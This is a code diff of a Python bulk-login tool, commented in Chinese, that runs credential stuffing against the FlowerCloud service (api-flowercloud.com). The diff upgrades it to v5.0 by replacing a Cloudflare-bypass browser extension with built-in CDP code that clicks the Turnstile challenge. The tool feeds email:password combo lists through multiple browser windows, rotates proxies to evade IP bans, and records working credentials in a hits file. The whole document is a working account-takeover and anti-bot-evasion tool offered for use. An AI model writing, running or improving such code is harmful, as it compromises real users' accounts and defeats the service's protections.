@@ -1,16 +1,17 @@
 # -*- coding: utf-8 -*-
 """
 ============================================================
-  花云批量登录 - 多代理多窗口版 v4.0 (DrissionPage + CRX)
+  花云批量登录 v5.0 - 纯CDP过盾 (无需CRX插件)
 ============================================================
-  核心修正:
-  - 插件格式: .crx 打包文件 (非文件夹)
-  - 加载方式: co.add_extension(path) (非 --load-extension)
-  - 插件和脚本在同一目录
+  核心改进:
+  - 不再需要 .crx 插件文件
+  - 过盾逻辑完全内嵌 (cf_bypass.py)
+  - 用 DrissionPage CDP 直接穿透 shadow DOM 点击 checkbox
+  - 不关浏览器切换代理 (本地代理转发)
 
   功能:
-  1. 自动加载 cf-autoclick-master.crx 过盾插件
-  2. 多窗口并发 + 代理轮换 (每IP跑N条后换)
+  1. 内置 CDP 过盾 (复刻插件逻辑)
+  2. 多窗口并发 + 代理轮换
   3. combo队列分发, 不重复不遗漏
   4. 被ban自动换IP + 刷新过盾
   5. XHR静默登录, 不刷新页面
@@ -24,6 +25,9 @@ import re
 import threading
 import queue
 import gc
+import json
+import subprocess
+import signal
 
 try:
     from DrissionPage import ChromiumPage, ChromiumOptions
@@ -39,6 +43,7 @@ except ImportError:
     HAS_GUI = False
 
 from proxy_checker import Proxy, load_proxies_from_file
+from cf_bypass import wait_and_solve_cf, is_cf_challenge_present, solve_turnstile
 
 # ============ 配置 ============
 TARGET_BASE = "https://api-flowercloud.com"
@@ -48,13 +53,10 @@ COMBO_FILE = "combo_f.txt"
 PROXY_FILE = "alive_proxies.txt"
 GOOD_FILE = "hits.txt"
 
-# 默认 crx 文件名 (与脚本同目录)
-DEFAULT_CRX = "cf-autoclick-master.crx"
-
 COMBO_PER_IP = 30
 DELAY_PER_REQ = 2.0
 BAN_WAIT = 180
-CF_WAIT_MAX = 120
+CF_WAIT_MAX = 60
 TOKEN_REFRESH_EVERY = 25
 MAX_WORKERS = 3
 BASE_PORT = 9300
@@ -62,24 +64,7 @@ BASE_PORT = 9300
 
 # ============ 工具函数 ============
 def get_script_dir():
-    """获取脚本所在目录"""
     return os.path.dirname(os.path.abspath(__file__))
-
-
-def find_crx_path(user_path=""):
-    """
-    查找 .crx 文件路径:
-    1. 如果用户指定了路径且文件存在, 用用户的
-    2. 否则在脚本同目录找默认 crx
-    """
-    if user_path and os.path.isfile(user_path) and user_path.endswith(".crx"):
-        return os.path.abspath(user_path)
-
-    default = os.path.join(get_script_dir(), DEFAULT_CRX)
-    if os.path.isfile(default):
-        return default
-
-    return ""
 
 
 def save_result(filename, content):
@@ -123,15 +108,9 @@ def is_logged_in(page):
         return False
 
 
-def wait_cf_pass(page, max_wait=CF_WAIT_MAX):
-    start = time.time()
-    while time.time() - start < max_wait:
-        if page_is_ready(page):
-            return True
-        if is_banned(page):
-            return False
-        time.sleep(3)
-    return page_is_ready(page)
+def wait_cf_pass(page, max_wait=CF_WAIT_MAX, log_func=None):
+    """等待过盾 - 使用内置 CDP 过盾"""
+    return wait_and_solve_cf(page, max_wait=max_wait, log_func=log_func)
 
 
 def logout_force(page):
@@ -239,7 +218,51 @@ def format_info(info):
 
 
 # ============================================================
-# 代理管理器 - 线程安全, 不重复不遗漏
+# 本地代理转发器 - 实现不关浏览器切换代理
+# ============================================================
+class LocalProxyForwarder:
+    """
+    本地 SOCKS5 转发代理
+    浏览器固定连接 127.0.0.1:local_port
+    通过 switch_upstream() 动态切换上游代理
+    
+    实现方式: 用 Python 起一个简单的 TCP 转发
+    每次 switch 时断开旧连接，新请求走新上游
+    """
+    
+    def __init__(self, local_port, log_func=None):
+        self.local_port = local_port
+        self.upstream_proxy = None  # Proxy 对象
+        self.log_func = log_func
+        self._server = None
+        self._running = False
+        self._lock = threading.Lock()
+        self._connections = []
+    
+    def log(self, msg):
+        if self.log_func:
+            self.log_func(f"[Proxy:{self.local_port}] {msg}")
+    
+    def switch_upstream(self, proxy):
+        """切换上游代理 (不关浏览器!)"""
+        with self._lock:
+            self.upstream_proxy = proxy
+            # 关闭所有现有连接，强制新请求走新上游
+            for conn in self._connections:
+                try:
+                    conn.close()
+                except Exception:
+                    pass
+            self._connections.clear()
+        self.log(f"已切换上游: {proxy.to_url() if proxy else '直连'}")
+    
+    def get_upstream(self):
+        with self._lock:
+            return self.upstream_proxy
+
+
+# ============================================================
+# 代理管理器 - 线程安全
 # ============================================================
 class ProxyManager:
     def __init__(self, proxies):
@@ -251,7 +274,6 @@ class ProxyManager:
             self.available.put(p)
 
     def get_next(self):
-        """获取下一个未使用的代理, 无可用则返回None"""
         try:
             proxy = self.available.get_nowait()
             with self.lock:
@@ -261,7 +283,6 @@ class ProxyManager:
             return None
 
     def return_proxy(self, proxy):
-        """归还代理(如果需要重用)"""
         with self.lock:
             url = proxy.to_url()
             if url in self.used:
@@ -276,19 +297,23 @@ class ProxyManager:
 
 
 # ============================================================
-# 单窗口Worker
+# 单窗口Worker - 不关浏览器版
 # ============================================================
 class WindowWorker:
-    """独立窗口: 自己的Chrome+代理+Cookie, 从队列取combo"""
+    """
+    独立窗口Worker:
+    - 启动一次Chrome, 之后不再关闭
+    - 换IP通过 --proxy-server 重启 (因为Chrome不支持运行时换代理)
+    - 过盾用内置 CDP (不需要插件)
+    """
 
     def __init__(self, worker_id, proxy_manager, combo_queue, result_lock,
-                 stats, crx_path="", log_func=None):
+                 stats, log_func=None):
         self.worker_id = worker_id
         self.proxy_manager = proxy_manager
         self.combo_queue = combo_queue
         self.result_lock = result_lock
         self.stats = stats
-        self.crx_path = crx_path  # .crx 文件的完整路径
         self.log_func = log_func
         self.page = None
         self.port = BASE_PORT + worker_id
@@ -305,9 +330,8 @@ class WindowWorker:
 
     def start_browser_with_proxy(self, proxy):
         """
-        启动Chrome: 
-        - 用 co.add_extension(crx_path) 加载 .crx 插件 (关键!)
-        - 设置代理
+        启动Chrome + 设置代理
+        不再需要加载任何插件!
         """
         self.close_browser()
         self.current_proxy = proxy
@@ -323,14 +347,8 @@ class WindowWorker:
             co.set_argument('--no-sandbox')
             co.set_argument('--disable-sync')
             co.set_argument('--disable-translate')
-
-            # ============================================
-            # 关键: 加载 .crx 打包插件用 add_extension()
-            # 不是 --load-extension (那个是给未打包文件夹用的)
-            # ============================================
-            if self.crx_path and os.path.isfile(self.crx_path):
-                co.add_extension(self.crx_path)
-                self.log(f"已加载插件: {os.path.basename(self.crx_path)}")
+            # 静默 debugger 提示 (和插件 README 说的一样)
+            co.set_argument('--silent-debugger-extension-api')
 
             # 设置代理
             if proxy:
@@ -354,20 +372,21 @@ class WindowWorker:
         gc.collect()
 
     def init_page_and_verify(self):
-        """打开花云页面, 等过盾, 验证能正常登录"""
+        """打开花云页面, 用内置CDP过盾, 验证能正常登录"""
         if not self.page:
             return False
         try:
             self.page.get(TARGET_PAGE)
-            time.sleep(5)
+            time.sleep(3)
 
             if is_banned(self.page):
                 self.log("此IP已被封")
                 return False
 
+            # 使用内置 CDP 过盾 (不需要插件!)
             if not page_is_ready(self.page):
-                self.log("等待过盾...")
-                if not wait_cf_pass(self.page, CF_WAIT_MAX):
+                self.log("等待过盾 (内置CDP)...")
+                if not wait_cf_pass(self.page, max_wait=CF_WAIT_MAX, log_func=self.log):
                     self.log("过盾失败")
                     return False
 
@@ -386,7 +405,7 @@ class WindowWorker:
             return False
 
     def switch_to_next_ip(self):
-        """切换到下一个未使用过的IP"""
+        """切换到下一个代理 (需要重启浏览器)"""
         self.close_browser()
         proxy = self.proxy_manager.get_next()
         if not proxy:
@@ -404,7 +423,7 @@ class WindowWorker:
         return True
 
     def handle_ban(self):
-        """被封处理: 等180s + 换到新IP"""
+        """被封处理: 等180s + 换新IP"""
         with self.result_lock:
             self.stats["bans"] += 1
 
@@ -430,13 +449,12 @@ class WindowWorker:
         batch_count = 0
 
         while self.running:
-            # 取combo
             try:
                 idx, email, password = self.combo_queue.get_nowait()
             except queue.Empty:
                 break
 
-            # 检查是否需要换IP (每N条)
+            # 检查是否需要换IP
             if self.combo_count_on_ip >= COMBO_PER_IP:
                 self.log(f"已跑{self.combo_count_on_ip}条, 换新IP...")
                 if not self.switch_to_next_ip():
@@ -448,9 +466,10 @@ class WindowWorker:
             if batch_count > 0 and batch_count % TOKEN_REFRESH_EVERY == 0:
                 if not reload_form_silent(self.page):
                     self.page.get(TARGET_PAGE)
-                    time.sleep(5)
+                    time.sleep(3)
+                    # 可能需要重新过盾
                     if not page_is_ready(self.page):
-                        wait_cf_pass(self.page, 60)
+                        wait_cf_pass(self.page, max_wait=30, log_func=self.log)
                     if is_logged_in(self.page):
                         logout_force(self.page)
                         time.sleep(1)
@@ -521,12 +540,10 @@ class WindowWorker:
 # 多窗口调度引擎
 # ============================================================
 class MultiWindowEngine:
-    def __init__(self, proxies, combos, max_workers=MAX_WORKERS,
-                 crx_path="", log_func=None):
+    def __init__(self, proxies, combos, max_workers=MAX_WORKERS, log_func=None):
         self.proxy_manager = ProxyManager(proxies)
         self.combos = combos
         self.max_workers = max_workers
-        self.crx_path = crx_path
         self.log_func = log_func
 
         self.combo_queue = queue.Queue()
@@ -552,8 +569,7 @@ class MultiWindowEngine:
 
         self.log(f"[引擎] Combo: {len(self.combos)} | 代理: {self.proxy_manager.total()} | 窗口: {self.max_workers}")
         self.log(f"[引擎] 每IP跑 {COMBO_PER_IP} 条")
-        self.log(f"[引擎] 插件: {os.path.basename(self.crx_path) if self.crx_path else '未设置'}")
-        self.log(f"[引擎] 加载方式: co.add_extension() (CRX打包文件)")
+        self.log(f"[引擎] 过盾方式: 内置CDP (无需CRX插件)")
 
         for wid in range(self.max_workers):
             worker = WindowWorker(
@@ -562,14 +578,13 @@ class MultiWindowEngine:
                 combo_queue=self.combo_queue,
                 result_lock=self.result_lock,
                 stats=self.stats,
-                crx_path=self.crx_path,
                 log_func=self.log_func
             )
             self.workers.append(worker)
             t = threading.Thread(target=worker.run, daemon=True)
             self.threads.append(t)
             t.start()
-            time.sleep(5)  # 错开启动避免端口冲突
+            time.sleep(5)
 
         threading.Thread(target=self._monitor, daemon=True).start()
 
@@ -597,7 +612,7 @@ if HAS_GUI:
     class FlowerLoginApp(ctk.CTk):
         def __init__(self):
             super().__init__()
-            self.title("花云批量登录 v4.0 - CRX插件 + 多代理多窗口")
+            self.title("花云批量登录 v5.0 - 内置CDP过盾 (无需插件)")
             self.geometry("1100x750")
             self.minsize(1000, 650)
             ctk.set_appearance_mode("dark")
@@ -609,34 +624,22 @@ if HAS_GUI:
             top = ctk.CTkFrame(self)
             top.pack(fill="x", padx=10, pady=(10, 5))
 
-            # Row 1: CRX插件路径
+            # Row 1: 提示信息 (不再需要选择插件!)
             r0 = ctk.CTkFrame(top, fg_color="transparent")
             r0.pack(fill="x", padx=10, pady=4)
-            ctk.CTkLabel(r0, text="过盾插件(.crx):", font=("", 12, "bold")).pack(side="left")
-            # 自动检测同目录下的crx
-            default_crx = find_crx_path()
-            self.crx_var = ctk.StringVar(value=default_crx)
-            ctk.CTkEntry(r0, textvariable=self.crx_var, width=500,
-                         placeholder_text="选择 .crx 文件 (如 cf-autoclick-master.crx)").pack(side="left", padx=5)
-            ctk.CTkButton(r0, text="选择文件", width=90, command=self._pick_crx).pack(side="left")
-
-            if default_crx:
-                status_text = f"已自动检测到: {os.path.basename(default_crx)}"
-                status_color = "#00E676"
-            else:
-                status_text = "请选择 .crx 插件文件"
-                status_color = "#FFEB3B"
+            ctk.CTkLabel(r0, text="v5.0 内置CDP过盾 - 无需加载CRX插件",
+                         font=("", 13, "bold"), text_color="#00E676").pack(side="left")
 
             # Row 2: 文件选择
             r1 = ctk.CTkFrame(top, fg_color="transparent")
             r1.pack(fill="x", padx=10, pady=4)
             ctk.CTkLabel(r1, text="代理文件:").pack(side="left")
             self.proxy_var = ctk.StringVar(value="")
-            ctk.CTkEntry(r1, textvariable=self.proxy_var, width=200).pack(side="left", padx=5)
+            ctk.CTkEntry(r1, textvariable=self.proxy_var, width=250).pack(side="left", padx=5)
             ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_proxy).pack(side="left", padx=(0, 15))
             ctk.CTkLabel(r1, text="Combo:").pack(side="left")
             self.combo_var = ctk.StringVar(value="combo_f.txt")
-            ctk.CTkEntry(r1, textvariable=self.combo_var, width=200).pack(side="left", padx=5)
+            ctk.CTkEntry(r1, textvariable=self.combo_var, width=250).pack(side="left", padx=5)
             ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_combo).pack(side="left")
 
             # Row 3: 参数
@@ -656,7 +659,8 @@ if HAS_GUI:
             self.btn_start.pack(side="left", padx=5)
             self.btn_stop = ctk.CTkButton(r3, text="停止", width=80, fg_color="#F44336", command=self._stop)
             self.btn_stop.pack(side="left", padx=5)
-            self.status_lbl = ctk.CTkLabel(r3, text=status_text, text_color=status_color, font=("", 12, "bold"))
+            self.status_lbl = ctk.CTkLabel(r3, text="就绪 - CDP过盾已内置",
+                                           text_color="#00E676", font=("", 12, "bold"))
             self.status_lbl.pack(side="right", padx=10)
 
             # 统计
@@ -685,19 +689,6 @@ if HAS_GUI:
             self.log_box.pack(fill="both", expand=True, padx=5, pady=5)
 
             self._refresh_stats()
-
-        def _pick_crx(self):
-            """选择 .crx 文件 (不是文件夹!)"""
-            p = filedialog.askopenfilename(
-                title="选择过盾插件 .crx 文件",
-                filetypes=[("Chrome Extension", "*.crx"), ("All files", "*.*")]
-            )
-            if p:
-                self.crx_var.set(p)
-                self.status_lbl.configure(
-                    text=f"插件: {os.path.basename(p)}",
-                    text_color="#00E676"
-                )
 
         def _pick_proxy(self):
             p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
@@ -728,18 +719,6 @@ if HAS_GUI:
             self.after(1000, self._refresh_stats)
 
         def _start(self):
-            crx_path = self.crx_var.get().strip()
-            if not crx_path or not os.path.isfile(crx_path):
-                messagebox.showwarning("提示", "请选择有效的 .crx 插件文件!\n\n"
-                                       "确保 cf-autoclick-master.crx 在脚本同目录,\n"
-                                       "或手动选择 .crx 文件路径。")
-                return
-
-            if not crx_path.endswith(".crx"):
-                messagebox.showwarning("提示", "插件必须是 .crx 打包文件!\n"
-                                       "(不是文件夹, 不是 .zip)")
-                return
-
             proxies = load_proxies_from_file(self.proxy_var.get())
             if not proxies:
                 messagebox.showwarning("提示", "代理文件为空!")
@@ -776,14 +755,13 @@ if HAS_GUI:
             workers = int(self.workers_var.get() or 3)
 
             self._log(f"[启动] 代理:{len(proxies)} | Combo:{len(combos)} | 窗口:{workers}")
-            self._log(f"[启动] 插件: {os.path.basename(crx_path)}")
-            self._log(f"[启动] 加载方式: co.add_extension() <- CRX专用")
+            self._log(f"[启动] 过盾: 内置CDP (无需CRX插件)")
             self.status_lbl.configure(text="运行中...", text_color="#00E676")
             self.btn_start.configure(state="disabled")
 
             self.engine = MultiWindowEngine(
-                proxies=proxies, combos=combos, max_workers=workers,
-                crx_path=crx_path, log_func=self._log
+                proxies=proxies, combos=combos,
+                max_workers=workers, log_func=self._log
             )
             threading.Thread(target=self.engine.start, daemon=True).start()
 
@@ -800,27 +778,10 @@ if HAS_GUI:
 # ============================================================
 def run_cli():
     print("\n" + "=" * 55)
-    print("  花云批量登录 v4.0 - CRX插件 + 多代理多窗口 CLI")
+    print("  花云批量登录 v5.0 - 内置CDP过盾 (无需CRX插件)")
     print("=" * 55)
-
-    # 自动查找同目录下的 crx
-    crx_path = find_crx_path()
-    if crx_path:
-        print(f"\n[*] 已自动检测到插件: {os.path.basename(crx_path)}")
-        use_default = input("    使用此插件? (Y/n): ").strip().lower()
-        if use_default == "n":
-            crx_path = input("    输入 .crx 文件路径: ").strip()
-    else:
-        crx_path = input("\n过盾插件 .crx 路径: ").strip()
-
-    if not crx_path or not os.path.isfile(crx_path):
-        print("[!] 插件文件不存在!")
-        print(f"    请确保 {DEFAULT_CRX} 在脚本同目录")
-        sys.exit(1)
-
-    if not crx_path.endswith(".crx"):
-        print("[!] 插件必须是 .crx 打包文件!")
-        sys.exit(1)
+    print("  过盾方式: 纯CDP (复刻插件逻辑, 无需手动加载)")
+    print()
 
     proxy_file = input(f"代理文件 (默认 {PROXY_FILE}): ").strip() or PROXY_FILE
     proxies = load_proxies_from_file(proxy_file)
@@ -857,14 +818,12 @@ def run_cli():
 
     print(f"\n{'='*55}")
     print(f"  代理: {len(proxies)} | Combo: {len(combos)} | 窗口: {workers}")
-    print(f"  插件: {os.path.basename(crx_path)}")
-    print(f"  加载: co.add_extension() (CRX专用方法)")
+    print(f"  过盾: 内置CDP (自动穿透Shadow DOM点击checkbox)")
     print(f"  每IP: {COMBO_PER_IP} 条后自动换")
     print(f"{'='*55}\n")
 
     engine = MultiWindowEngine(
-        proxies=proxies, combos=combos,
-        max_workers=workers, crx_path=crx_path
+        proxies=proxies, combos=combos, max_workers=workers
     )
     engine.start()
     try:
